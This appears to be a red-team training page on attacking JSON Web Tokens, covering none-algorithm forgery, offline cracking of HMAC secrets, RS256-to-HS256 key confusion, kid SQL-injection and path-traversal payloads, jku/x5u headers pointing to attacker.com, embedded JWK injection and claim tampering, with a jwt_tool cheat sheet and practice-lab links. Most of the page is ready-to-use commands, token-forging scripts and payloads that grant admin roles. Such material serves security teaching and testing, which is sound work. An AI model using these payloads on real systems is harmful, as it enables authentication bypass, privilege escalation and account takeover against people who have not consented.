---
layout: training-page
title: "JWT Attacks — Red Team Academy"
module: "Web Hacking"
tags:
  - jwt
  - algorithm-confusion
  - none-alg
  - kid-injection
  - auth-bypass
page_key: "web-jwt-attacks"
render_with_liquid: false
---

# JWT Attacks

JSON Web Tokens (JWTs) are used for authentication and authorization across APIs and web applications. Misconfigurations in signature verification, algorithm handling, and key management lead to authentication bypass, privilege escalation, and account takeover. This page covers all major JWT attack classes.

## JWT Structure & Tooling

```
# JWT format: header.payload.signature (base64url encoded)
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"user123","role":"user","exp":9999999999}
# Signature: HMACSHA256(base64(header)+"."+base64(payload), secret)

# Decode without verification:
echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyMTIzIn0.xxx" | \
  cut -d'.' -f1,2 | tr '.' '\n' | base64 -d 2>/dev/null

# jwt_tool — Swiss army knife for JWT attacks:
# https://github.com/ticarpi/jwt_tool
pip3 install jwt_tool
jwt_tool TOKEN                    # decode and display
jwt_tool TOKEN --crack -d /usr/share/wordlists/rockyou.txt  # brute force
jwt_tool TOKEN -X a               # none algorithm attack
jwt_tool TOKEN -X s               # algorithm confusion RS256→HS256
jwt_tool TOKEN -I -pc role -pv admin  # inject payload claim
```

## None Algorithm Attack

Some libraries accept `"alg":"none"` and skip signature verification entirely.

```
# Step 1: Decode the JWT (base64url decode header and payload)
# Step 2: Modify payload (e.g., change "role":"user" to "role":"admin")
# Step 3: Set alg to "none" in header
# Step 4: Remove signature entirely (keep trailing dot)

# Manual:
# Original header base64url:
echo '{"alg":"HS256","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_'
# New header:
echo '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_'
# New payload (modified):
echo '{"sub":"user123","role":"admin","exp":9999999999}' | base64 | tr -d '=' | tr '+/' '-_'
# Craft token: HEADER.PAYLOAD. (empty signature, trailing dot)

# With jwt_tool:
jwt_tool TOKEN -X a                          # none alg
jwt_tool TOKEN -X a -I -pc role -pv admin    # none alg + inject admin role

# Also try: "alg":"None", "alg":"NONE", "alg":"nOnE"
```

## Weak HMAC Secret — Brute Force

HS256/HS384/HS512 tokens signed with weak secrets can be cracked offline.

```
# hashcat — JWT cracking:
# Mode 16500 = JWT HS256/HS384/HS512
hashcat -a 0 -m 16500 TOKEN /usr/share/wordlists/rockyou.txt
hashcat -a 3 -m 16500 TOKEN "?l?l?l?l?l?l"  # brute force 6 lowercase chars

# john the ripper:
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

# jwt_tool brute force:
jwt_tool TOKEN --crack -d /usr/share/wordlists/rockyou.txt

# Common weak secrets to try manually:
# secret, password, 123456, admin, changeme, jwt_secret
# Application name, domain name, environment name

# Once cracked — forge arbitrary tokens:
python3 -c "
import jwt
payload = {'sub':'admin','role':'admin','exp':9999999999}
token = jwt.encode(payload, 'secret', algorithm='HS256')
print(token)
"
```

## Algorithm Confusion (RS256 → HS256)

When a server uses RS256 (asymmetric) and the public key is obtainable, you can sign a new token with HS256 using the public key as the HMAC secret. A confused library will verify HMAC using the public key — and your forged token passes.

```
# Step 1: Obtain the public key
# Common locations:
curl https://target/.well-known/jwks.json        # JWKS endpoint
curl https://target/.well-known/openid-configuration  # OIDC discovery

# Step 2: Convert JWK to PEM (if JWKS format):
# Use jwt_tool or python-jose to extract PEM from JWKS

# Step 3: Sign with HS256 using public key PEM as secret
python3 -c "
import jwt
with open('public_key.pem', 'r') as f:
    pub_key = f.read()
payload = {'sub':'admin','role':'admin','exp':9999999999}
# Use public key as HMAC secret:
token = jwt.encode(payload, pub_key, algorithm='HS256')
print(token)
"

# With jwt_tool (automatic):
jwt_tool TOKEN -X s -pk public_key.pem

# Detection: Server uses RS256 in header; try HS256 signed with public key
# Vulnerable condition: library treats algorithm as user-controlled
# Fix: whitelist expected algorithms server-side
```

## kid (Key ID) Injection

The `kid` header parameter specifies which key to use for verification. If it's passed to a SQL query or filesystem path without sanitization, injection is possible.

```
# SQL injection via kid:
# If server does: SELECT secret FROM keys WHERE id='$kid'
# Set kid to: ' UNION SELECT 'attacker_secret'--
# Then sign token with HMAC using 'attacker_secret'

# Example forged header:
{"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'pwned'-- "}
# Sign token with key = 'pwned'

# Path traversal via kid:
# If server loads: /keys/$kid.pem
# Set kid: ../../../../dev/null
# Then sign with empty string as secret (content of /dev/null)
{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}

# With jwt_tool:
jwt_tool TOKEN -I -hc kid -hv "' UNION SELECT 'pwned'-- " -S hs256 -p "pwned"

# jku / x5u header injection (load attacker-controlled keys):
# jku points to JWKS endpoint — host your own JWKS with your key pair
# x5u points to X.509 cert — same concept
{"alg":"RS256","jku":"https://attacker.com/jwks.json","kid":"attacker"}
```

## Embedded JWK Attack

The `jwk` header allows embedding the public key directly. Vulnerable servers use the embedded key to verify without validating it's trusted.

```
# Generate attacker key pair:
openssl genrsa -out attacker_priv.pem 2048
openssl rsa -in attacker_priv.pem -pubout -out attacker_pub.pem

# Generate JWK from private key (using python-jose or jwt_tool):
jwt_tool TOKEN -X i    # inject self-signed JWK

# Manual (python):
from jwcrypto import jwt, jwk
key = jwk.JWK.generate(kty='RSA', size=2048)
# Create token with embedded JWK in header
# Sign with private key — server uses embedded public key to verify
```

## JWT Expiry & Claims Manipulation

```
# Remove expiry (exp claim):
jwt_tool TOKEN -I -pd exp

# Extend expiry:
jwt_tool TOKEN -I -pc exp -pv 9999999999

# Privilege escalation via claims:
jwt_tool TOKEN -I -pc role -pv admin -pc isAdmin -pv true
jwt_tool TOKEN -I -pc sub -pv admin@target.com

# Sign with known/cracked secret:
jwt_tool TOKEN -I -pc role -pv admin -S hs256 -p "cracked_secret"

# Common privilege claims to modify:
# role, isAdmin, admin, group, permission, scope, email, sub, user_id
```

## JWT Attack Payload Reference

Key attack payloads and techniques from PayloadsAllTheThings JWT reference.

### None Algorithm Variants

```
# All none algorithm capitalization variants to try:
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"nOnE","typ":"JWT"}

# Null signature attack (CVE-2020-28042) — send HS256 token without signature:
# TOKEN format: header.payload.  (trailing dot, empty signature)
python3 jwt_tool.py JWT_HERE -X n

# Signature disclosure attack (CVE-2019-7644) — send wrong signature:
# Some libraries respond with: "Expected CORRECT_SIG got YOUR_SIG"
# Extract the correct signature from the error message
```

### Key Confusion (RS256 to HS256)

```
# Method 1 — obtain public key from TLS certificate:
openssl s_client -connect target.com:443 | openssl x509 -pubkey -noout

# Method 2 — obtain from JWKS endpoint:
curl https://target/.well-known/jwks.json

# Method 3 — recover public key from two signed JWTs:
# Some tools can compute RSA public key from two signatures with same key
# (mathematical derivation from RS256 signatures)

# Sign with HS256 using public key as secret (pyjwt 0.4.3):
pip install pyjwt==0.4.3
python3 -c "
import jwt
public = open('public.pem', 'r').read()
payload = {'sub':'admin','role':'admin','exp':9999999999}
token = jwt.encode(payload, key=public, algorithm='HS256')
print(token)
"

# Using jwt_tool:
python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem

# Using Burp JWT Editor (PortSwigger):
# 1. Import public key as New RSA Key
# 2. Copy PEM, base64-encode it
# 3. Generate New Symmetric Key, replace k value with base64-PEM
# 4. Change alg to HS256, click Sign (Don't modify header)
```

### JWT kid and jku Injection

```
# kid SQL injection:
{"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'pwned'-- "}
# Sign token with key = 'pwned'
python3 jwt_tool.py JWT_HERE -I -hc kid -hv "' UNION SELECT 'pwned'-- " -S hs256 -p "pwned"

# kid path traversal (sign with /dev/null = empty string):
{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
# Sign with empty string as key
python3 jwt_tool.py JWT_HERE -I -hc kid -hv "../../../../dev/null" -S hs256 -p ""

# jku header injection — host your own JWKS:
{"alg":"RS256","jku":"https://attacker.com/jwks.json","kid":"attacker-key"}
# Generate RSA key pair, host JWKS with your public key, sign with private key

# x5u header injection (X.509 cert URL):
{"alg":"RS256","x5u":"https://attacker.com/cert.pem","kid":"attacker"}

# Embedded JWK attack (CVE-2018-0114):
python3 jwt_tool.py JWT_HERE -X i    # auto-generates embedded JWK
```

## JWT Algorithm Confusion Payloads

Algorithm table and confusion attack summary for quick reference.

```
# JWT algorithm identifiers (alg header values):
# HS256/384/512 — HMAC (symmetric) — same key signs and verifies
# RS256/384/512 — RSA  (asymmetric) — private key signs, public key verifies
# ES256/384/512 — ECDSA (asymmetric)
# PS256/384/512 — RSA-PSS
# none          — no signature (dangerous if accepted)

# Algorithm confusion attack matrix:
# Server configured for → Attack as →
# RS256                 → HS256 (use RSA public key as HMAC secret)
# RS384                 → HS384
# ES256                 → HS256 (use EC public key)

# Check for confusion: get a valid RS256 token, modify alg to HS256,
# sign with the public key as HMAC secret, submit

# jwt_tool cheatsheet:
jwt_tool TOKEN                          # decode and analyze
jwt_tool TOKEN -X a                     # none algorithm attack
jwt_tool TOKEN -X n                     # null signature attack
jwt_tool TOKEN -X k -pk public_key.pem  # key confusion (RS256→HS256)
jwt_tool TOKEN -X i                     # embedded JWK attack
jwt_tool TOKEN -X s                     # algorithm confusion
jwt_tool TOKEN -I -pc role -pv admin -S hs256 -p "secret"  # inject + sign
jwt_tool TOKEN --crack -d rockyou.txt   # brute force HMAC secret
```

## JWT Labs & Tools

**PortSwigger Practice Labs (recommended in sequence):**
- JWT authentication bypass via unverified signature — `portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature`
- JWT authentication bypass via weak signing key — `portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key`
- JWT authentication bypass via jwk header injection — `portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection`
- JWT authentication bypass via algorithm confusion — `portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-algorithm-confusion`

- PortSwigger JWT labs — `portswigger.net/web-security/jwt`
- jwt_tool — `github.com/ticarpi/jwt_tool`
- jwt.io — online decoder/debugger
- hashcat JWT cracking — mode 16500
- HackTricks JWT — `book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens`
